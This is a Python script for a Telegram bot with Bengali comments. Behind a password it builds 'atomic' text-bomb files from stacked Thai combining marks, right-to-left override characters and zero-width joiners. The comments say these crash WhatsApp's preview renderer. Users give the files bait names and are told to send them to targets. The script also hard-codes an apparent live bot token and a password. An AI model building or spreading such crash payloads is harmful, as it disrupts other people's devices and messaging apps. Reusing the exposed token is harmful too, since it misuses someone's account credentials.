import logging
import sqlite3
import os
import time
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, MessageHandler, filters, ContextTypes, ConversationHandler

# ১. লগিং (সিস্টেম মনিটর করার জন্য)
logging.basicConfig(level=logging.WARNING)

# ২. কনফিগারেশন (আপনার টোকেন এবং মাস্টার পাসওয়ার্ড)
TOKEN = "8675593212:AAG6_m5ZFEqG-qkutygxbuoOetMv9N87TnY"
CORRECT_PASSWORD = "MIZANUR RAHMAN"

# ৩. কনভারসেশন স্টেটস
WAITING_FOR_PASSWORD = 1
WAITING_FOR_FILENAME = 2

# ৪. ডাটাবেস সেটআপ
def init_db():
    conn = sqlite3.connect('mr_dev_atomic.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৫. ১-২ এমবি পারমাণবিক পেলোড জেনারেটর (মরণফাঁদ)
async def generate_atomic_payload(filename, status_msg):
    if not filename.endswith(".txt"):
        filename += ".txt"
    
    # এটি হলো মূল বোমার মশলা (হোয়াটসঅ্যাপ প্রিভিউয়ার কিলিং প্যাটার্ন)
    # Thai Loop + RTL Confusion + ZWJ Buffer Overflow
    atomic_pattern = (
        "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 400 + # Rendering Engine Crash
        "\u202E\u202D" * 200 +                             # UI Direction Loop
        "\u200B\u200C\u200D\uFEFF" * 250 +                 # RAM Overflow
        "☣️" * 50                                          # Exploit Marker
    )
    
    header = f"☢️_ATOMIC_DEATH_BY_M_R_DEV_ID_{int(time.time())}_☢️\n"
    
    # পেলোড ঘনত্ব (Density) এমনভাবে রাখা হয়েছে যাতে ১ এমবি-তেই কাজ হয়
    deadly_block = (header + atomic_pattern) * 12 
    
    try:
        await status_msg.edit_text(f"🚀 '{filename}' বোমায় বারুদ ভরা হচ্ছে...")
        with open(filename, "w", encoding="utf-8") as f:
            # ১০-১৫ বার লুপ দিলে এটি ১.৫ এমবি-র মতো সলিড ডেথ ফাইল হবে
            for i in range(1, 16):
                f.write(deadly_block)
        return filename
    except Exception:
        return None

# ৬. হ্যান্ডলার ফাংশনসমূহ
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("🚀 CREATE ATOMIC VIRUS")], [KeyboardButton("📊 STATUS")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        f"🔥 **M R DEVELOPER NUCLEAR PANEL** 🔥\n\nমামা খেলা শুরু করতে বাটন চাপুন।",
        reply_markup=reply_markup
    )
    return ConversationHandler.END

async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔑 **মাস্টার পাসওয়ার্ড দিন:**", reply_markup=ReplyKeyboardRemove())
    return WAITING_FOR_PASSWORD

async def check_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == CORRECT_PASSWORD:
        await update.message.reply_text("✅ এক্সেস গ্রান্টেড! \n\nএখন **ফাইলের নাম** কী দিবেন? (যেমন: `transection_list` বা `hot_video`)")
        return WAITING_FOR_FILENAME
    else:
        await update.message.reply_text("❌ পাসওয়ার্ড ভুল! আবার ট্রাই করেন মামা।")
        return WAITING_FOR_PASSWORD

async def create_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    custom_name = update.message.text.strip().replace(" ", "_")
    status = await update.message.reply_text("☢️ পারমাণবিক বোমা তৈরি হচ্ছে... একটু ধরুন।")
    
    file_path = await generate_atomic_payload(custom_name, status)
    
    if file_path and os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as doc:
                await update.message.reply_document(
                    document=doc, 
                    caption=f"🔥 **ATOMIC BOMB READY!**\n\nফাইলের নাম: `{file_path}`\n\nএটি হোয়াটসঅ্যাপে ডকুমেন্ট হিসেবে পাঠান। স্ক্যামারের গোয়া লাল হয়ে যাবে! 😂"
                )
            # আপডেট স্ট্যাটাস
            conn = sqlite3.connect('mr_dev_atomic.db')
            cur = conn.cursor()
            cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
            conn.commit()
            conn.close()
        except Exception:
            await update.message.reply_text("❌ বোমা পাঠাতে এরর হয়েছে!")
        finally:
            if os.path.exists(file_path): os.remove(file_path)
    
    await status.delete()
    keyboard = [[KeyboardButton("🚀 CREATE ATOMIC VIRUS")], [KeyboardButton("📊 STATUS")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("পরবর্তী মিশনের জন্য রেডি?", reply_markup=reply_markup)
    return ConversationHandler.END

async def show_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect('mr_dev_atomic.db')
    cur = conn.cursor()
    cur.execute("SELECT count FROM stats WHERE id=1")
    total = cur.fetchone()[0]
    conn.close()
    await update.message.reply_text(f"📊 মোট {total} টি আইডি 'ফাঁহ' করা হয়েছে।")

# ৭. মেইন রানার
def main():
    init_db()
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^🚀 CREATE ATOMIC VIRUS$'), ask_password)],
        states={
            WAITING_FOR_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_password)],
            WAITING_FOR_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_and_send)],
        },
        fallbacks=[MessageHandler(filters.Regex('^/start$'), start)],
    )

    application.add_handler(conv_handler)
    application.add_handler(MessageHandler(filters.Regex('^/start$'), start))
    application.add_handler(MessageHandler(filters.Regex('^📊 STATUS$'), show_status))
    
    print("M R DEVELOPER Nuclear Bot is Online!")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
    
